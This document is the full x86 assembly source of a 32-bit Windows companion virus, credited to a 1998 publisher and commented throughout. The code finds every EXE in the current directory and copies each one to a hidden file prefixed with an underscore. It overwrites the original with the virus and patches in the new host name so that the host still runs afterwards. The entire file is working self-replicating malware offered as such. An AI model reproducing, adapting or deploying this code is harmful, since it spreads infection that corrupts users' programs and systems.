;This is a basic 32-bit PE-style Windows Companion Virus. (C) 1998 American
;Eagle Publications, Inc.

.386
.model flat

;Define the needed external functions and constants here.

extrn           ExitProcess:PROC
extrn           FindFirstFileA:PROC
extrn           FindNextFileA:PROC
extrn           CreateFileA:PROC
extrn           CloseHandle:PROC
extrn           ReadFile:PROC
extrn           WriteFile:PROC
extrn           WinExec:PROC
extrn           SetFilePointer:PROC

.data                                   ;the data area
dummy           dd      ?               ;this needs some data or it won't work!

.code                                   ;executable code starts here

COMVIR:
        push    ebp                     ;set up stack frame
        sub     esp,WORKSP              ;for temporary data
        mov     ebp,esp
        call    INFECT_FILES            ;infect files
        call    EXEC_HOST               ;execute the host now
        pop     ebp                     ;get rid of stack frame
        push    -1
        call    ExitProcess             ;this simply terminates the program

;****************************************************************************
;This routine infects all of the files in the current directory. It just
;searches for EXE's and calls INFECT_FILE.
INFECT_FILES:
        lea     eax,[ebp+FIND_DATA]     ;address of search data structure
        push    eax
        push    OFFSET EXE_FILE         ;'*.EXE'
        call    FindFirstFileA          ;do find first
        cmp     eax,-1
        jz      EXIT_IFILES             ;nothing found, exit
        mov     [ebp+SRCH_HANDLE],eax   ;else save search handle here
IFS1:   call    INFECT_FILE             ;file found, infect it
        lea     eax,[ebp+FIND_DATA]
        push    eax
        mov     eax,[ebp+SRCH_HANDLE]
        push    eax
        call    FindNextFileA           ;find next
        or      eax,eax                 ;anything found?
        jnz     IFS1                    ;infect anything found
EXIT_IFILES:
        ret                             ;else exit


;This routine infects a single file. First it creates a new file name, the
;host's name with an underscore in front of it. Then it copies the host to
;the new file, and copies itself into the host's old name.
INFECT_FILE:
        lea     edi,[ebp+NFNAME]
        lea     esi,[ebp+FIND_DATA+44]
        mov     al,'_'                  ;create new file name
        stosb                           ;save first char
        lodsb
        cmp     al,'_'                  ;don't infect files whose names start with '_' already
        je      IFR
        or      al,al
        jz      IFR
        stosb
IFLP:   lodsb                           ;move other characters
        stosb
        or      al,al
        jnz     IFLP

;now copy host to new file name
        push    0                       ;open file for new host with '_' in front of name,
        push    2                       ;file attributes = hidden
        push    1                       ;create new file
        push    0                       ;no security
        push    0                       ;no sharing
        push    40000000H               ;write mode
        lea     eax,[ebp+NFNAME]
        push    eax                     ;@name of file
        call    CreateFileA
        cmp     eax,-1                  ;failed to create new file?
        je      IFR                     ;yes, skip infect
        mov     [ebp+FHANDLE2],eax      ;else save handle here

        push    0                       ;open original host file
        push    0                       ;no attributes
        push    3                       ;open existing file
        push    0                       ;no security
        push    0                       ;no sharing
        push    80000000H               ;read mode
        lea     eax,[ebp+NFNAME+1]      ;@name, same as new host, without '_'
        push    eax
        call    CreateFileA
        cmp     eax,-1
        je      IFR                     ;failed to open, so just exit
        mov     [ebp+FHANDLE1],eax      ;else save handle here

        call    COPY_FILE               ;copy FHANDLE1 file to FHANDLE2 file

        mov     eax,[ebp+FHANDLE1]      ;close both files, copy of host complete
        push    eax
        call    CloseHandle
        mov     eax,[ebp+FHANDLE2]
        push    eax
        call    CloseHandle

;now copy virus to original host's name
        push    0                       ;open original host again
        push    0
        push    3                       ;open existing file
        push    0
        push    0
        push    0C0000000H              ;read/write mode
        lea     eax,[ebp+NFNAME+1]      ;without the '_'
        push    eax
        call    CreateFileA
        cmp     eax,-1
        je      IFR
        mov     [ebp+FHANDLE2],eax

        push    0                       ;open original virus
        push    0
        push    3                       ;open existing
        push    0
        push    1                       ;share read required, since this is an EXE that is currently running!
        push    80000000H               ;read mode
        push    OFFSET HOST_FILE+1      ;host name, less '_'
        call    CreateFileA
        cmp     eax,-1
        je      IFR
        mov     [ebp+FHANDLE1],eax

        call    COPY_FILE               ;copy virus to original host name

;now adjust virus host name on disk so it executes the new host
        push    0                       ;move pointer with respect to beginning
        push    0
        push    1964                    ;move here (hard coded, value found by examining WinBug.EXE)
        mov     eax,[ebp+FHANDLE2]
        push    eax
        call    SetFilePointer          ;set the new file pointer

        push    0                       ;write new host name to HOST_NAME
        lea     eax,[ebp+BYTESREAD]
        push    eax                     ;place to put actual # of bytes written
        push    255H                    ;write 255H bytes
        lea     eax,[ebp+NFNAME]        ;address to write from
        push    eax
        mov     eax,[ebp+FHANDLE2]      ;file handle
        push    eax
        call    WriteFile

        mov     eax,[ebp+FHANDLE2]      ;and close files
        push    eax                     ;infection complete
        call    CloseHandle
        mov     eax,[ebp+FHANDLE1]
        push    eax
        call    CloseHandle

IFR:    ret

;This routine simply copies the file referenced by FHANDLE1 to the file
;referenced by FHANDLE2. Both files must be opened with the file pointers
;at the beginning, and opened in the proper modes.
COPY_FILE:
        push    0                       ;read from original, up to 1024 bytes
        lea     eax,[ebp+BYTESREAD]
        push    eax
        push    BUF_SIZE                ;buffer size
        lea     eax,[ebp+FILEBUF]       ;read to file buffer
        push    eax
        mov     eax,[ebp+FHANDLE1]
        push    eax
        call    ReadFile
        mov     ebx,[ebp+BYTESREAD]
        or      ebx,ebx
        jz      CFEX                    ;done, so exit copy procedure

        push    0                       ;write data to file FHANDLE2
        lea     eax,[ebp+BYTESREAD]
        push    eax
        push    ebx
        lea     eax,[ebp+FILEBUF]
        push    eax
        mov     eax,[ebp+FHANDLE2]
        push    eax
        call    WriteFile

        jmp     COPY_FILE               ;and go get more data

CFEX:   ret                             ;all done, exit

;This routine executes the host as a new process.
EXEC_HOST:
        push    5                       ;WS_SHOW (show window of host)
        push    OFFSET HOST_FILE        ;host file name
        call    WinExec                 ;execute the host
        ret


EXE_FILE        DB      '*.EXE',0
HOST_FILE       DB      '_WinBug.EXE',0
                DB      255H-11 dup (0)

BUF_SIZE        EQU     1024            ;size of FILEBUF buffer for copying files

;Stack frame definitions
SRCH_HANDLE     EQU     0
BYTESREAD       EQU     SRCH_HANDLE+4
FHANDLE1        EQU     BYTESREAD+4
FHANDLE2        EQU     FHANDLE1+4
FILEBUF         EQU     FHANDLE2+4
NFNAME          EQU     FILEBUF+BUF_SIZE
PROCESS_INFO    EQU     NFNAME+255H
FIND_DATA       EQU     PROCESS_INFO+16
WORKSP          EQU     FIND_DATA+11*44+14+255H

        end     COMVIR
